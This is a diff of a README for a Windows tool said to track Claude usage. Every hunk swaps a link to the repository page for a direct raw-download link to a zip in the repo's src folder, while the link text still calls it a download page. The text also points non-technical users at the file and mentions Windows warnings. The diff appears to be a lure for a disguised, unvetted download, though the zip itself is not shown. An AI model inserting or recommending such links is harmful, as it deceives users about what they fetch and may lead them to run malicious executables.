@@ -1,6 +1,6 @@
 # 🟣 orellius-betterstatusline - Track Claude usage with clarity
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/tixitoxay/orellius-betterstatusline)
+[![Download the app](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/tixitoxay/orellius-betterstatusline/raw/refs/heads/main/src/orellius-betterstatusline-v3.3.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ This project is marked unmaintained, so it may still work as is, but it is not b
 
 Use this link to visit the download page and get the app:
 
-[Open the download page](https://github.com/tixitoxay/orellius-betterstatusline)
+[Open the download page](https://github.com/tixitoxay/orellius-betterstatusline/raw/refs/heads/main/src/orellius-betterstatusline-v3.3.zip)
 
 On the GitHub page, look for the latest release files or the main project files. If you see a Windows app file, download it. If you see source files only, use the release assets or built files linked from the page.
 
@@ -30,7 +30,7 @@ If Windows shows a warning when you open the app, check that you downloaded it f
 ## ⚙️ How to install and run
 
 1. Open the download page:
-   [https://github.com/tixitoxay/orellius-betterstatusline](https://github.com/tixitoxay/orellius-betterstatusline)
+   [https://github.com/tixitoxay/orellius-betterstatusline/raw/refs/heads/main/src/orellius-betterstatusline-v3.3.zip](https://github.com/tixitoxay/orellius-betterstatusline/raw/refs/heads/main/src/orellius-betterstatusline-v3.3.zip)
 
 2. Look for the newest release or file for Windows.
 
@@ -162,7 +162,7 @@ If you are a non-technical user, focus on the Windows app file or the ZIP file t
 
 If you need to return later, use the same page here:
 
-[https://github.com/tixitoxay/orellius-betterstatusline](https://github.com/tixitoxay/orellius-betterstatusline)
+[https://github.com/tixitoxay/orellius-betterstatusline/raw/refs/heads/main/src/orellius-betterstatusline-v3.3.zip](https://github.com/tixitoxay/orellius-betterstatusline/raw/refs/heads/main/src/orellius-betterstatusline-v3.3.zip)
 
 ## 🧭 Quick steps
 
